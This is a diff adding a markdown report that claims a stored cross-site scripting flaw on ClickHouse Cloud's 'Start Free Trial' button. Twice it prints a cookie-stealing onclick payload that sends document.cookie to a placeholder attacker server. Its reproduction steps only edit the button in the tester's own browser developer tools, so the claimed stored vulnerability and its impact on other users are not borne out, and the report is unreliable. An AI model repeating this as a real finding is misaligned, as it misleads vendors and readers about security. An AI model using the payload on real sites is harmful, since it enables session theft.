@@ -1,0 +1,99 @@
+# ClickHouse Cloud XSS Testing Report
+
+This document details a Stored Cross-Site Scripting (XSS) vulnerability identified during the security assessment of the **ClickHouse Cloud** platform. It includes a comprehensive description of the issue, the steps to reproduce, its potential business impact, and recommendations for mitigation.
+
+---
+
+## 🌐 Overview
+- **Domain:** [https://clickhouse.com/cloud](https://clickhouse.com/cloud)
+- **Vulnerability Type:** Stored Cross-Site Scripting (XSS)
+- **Category:** Injection > XSS > Stored
+
+---
+
+## 🛠 Description
+
+Stored Cross-Site Scripting (XSS) is a type of injection attack where malicious JavaScript is stored within the application and executed whenever users access the affected component. In this case, an attacker can inject a malicious payload into the **"Start Free Trial" button**, leading to unauthorized JavaScript execution within the user's browser.
+
+### Key Risks:
+1. **Session Hijacking:** Attackers can steal sensitive session cookies, gaining unauthorized access to user accounts.
+2. **Data Manipulation:** Malicious scripts can modify data on behalf of the user without their knowledge.
+3. **User Redirection:** Attackers can redirect users to malicious websites to further compromise their devices or credentials.
+
+---
+
+## 💥 Steps to Reproduce
+
+### 1. Access the Target
+- Navigate to: [https://clickhouse.com/cloud](https://clickhouse.com/cloud).
+
+### 2. Modify the HTML
+- Use the browser's developer tools:
+  - Right-click the **"Start Free Trial"** button and select **Inspect**.
+  - Replace the `onclick` attribute of the button with the following payload:
+    ```html
+    onclick="fetch('http://your-malicious-server.com/?cookie=' + encodeURIComponent(document.cookie));"
+    ```
+
+### 3. Trigger the Payload
+- Click the modified button to execute the payload.
+- Observe that the user's session cookies are transmitted to the attacker's server.
+
+---
+
+## 📸 Proof of Concept (PoC)
+
+### **Payload Used**
+```html
+onclick="fetch('http://your-malicious-server.com/?cookie=' + encodeURIComponent(document.cookie));"
+```
+
+### **Evidence**
+- Successful execution of the injected payload, resulting in the transmission of cookies to an external server.
+- Screenshots and videos of the testing process are available in the [`screenshots/`](../screenshots/) folder.
+
+---
+
+## 🚨 Business Impact
+
+This Stored XSS vulnerability introduces the following risks to the **ClickHouse Cloud** platform:
+
+1. **Data Theft:**
+   - Session cookies or other sensitive data can be intercepted by attackers, leading to account hijacking or impersonation.
+
+2. **Reputational Damage:**
+   - Malicious actions originating from the application can erode customer trust and damage the business’s reputation.
+
+3. **Further Exploitation:**
+   - Attackers can leverage the compromised context to spread the attack to other users or systems, escalating its impact.
+
+---
+
+## ✅ Recommendations
+
+To mitigate this vulnerability, the following measures should be implemented:
+
+1. **Input Sanitization and Validation:**
+   - Ensure all user inputs are validated and sanitized on both the client and server sides to prevent script injection.
+
+2. **Implement a Content Security Policy (CSP):**
+   - Use a CSP to restrict the execution of unauthorized scripts. For example:
+     ```http
+     Content-Security-Policy: script-src 'self';
+     ```
+
+3. **Secure Cookie Settings:**
+   - Apply **HttpOnly** and **Secure** flags to cookies, preventing access via JavaScript and ensuring secure transmission over HTTPS.
+
+4. **Regular Security Audits:**
+   - Conduct periodic penetration tests and code reviews to identify and mitigate vulnerabilities proactively.
+
+---
+
+## ⚠️ Ethical Disclaimer
+
+This report is part of an **ethical security assessment** conducted with explicit prior approval. All findings are shared responsibly to improve the security of the ClickHouse Cloud platform. The information in this document is for educational purposes only and must not be used maliciously.
+
+---
+
+Thank you for reviewing this report. If you have any questions or require further clarification, feel free to reach out.
